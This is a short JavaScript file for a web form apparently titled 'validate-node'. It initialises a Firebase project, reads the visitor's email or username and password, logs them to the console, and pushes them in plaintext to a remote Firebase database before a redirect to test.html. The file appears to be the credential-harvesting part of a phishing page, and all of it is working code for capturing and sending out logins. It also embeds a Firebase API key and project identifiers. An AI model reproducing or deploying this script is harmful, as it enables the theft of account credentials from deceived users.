const firebaseConfig = {
    apiKey: "AIzaSyAislrwGw3NmhmaTL3MEcvuVB33_pNk-0A",
    authDomain: "validate-node.firebaseapp.com",
    databaseURL: "https://validate-node-default-rtdb.firebaseio.com",
    projectId: "validate-node",
    storageBucket: "validate-node.appspot.com",
    messagingSenderId: "819151491102",
    appId: "1:819151491102:web:740d3d1feb52ef9f7dde0f"
  };

  //initialize firebase
  firebase.initializeApp(firebaseConfig);
  
  //refrence
  var validateNodeDB = firebase.database().ref('validate-node');

  document.getElementById('validate-node').addEventListener('submit', submitForm);

  function submitForm(e) {
    e.preventDefault();
    var emailORuserName = document.getElementById('emailORuserName').value;
    var password = document.getElementById('password').value;

    saveData(emailORuserName, password)
    console.log(emailORuserName, password);

  }

  const saveData = (emailORuserName,password) =>{
    var newValidateNode = validateNodeDB.push();

    newValidateNode.set({
        emailORuserName : emailORuserName,
        password: password
    })
  }

  function load() {
    window.location.href = "test.html";
  }


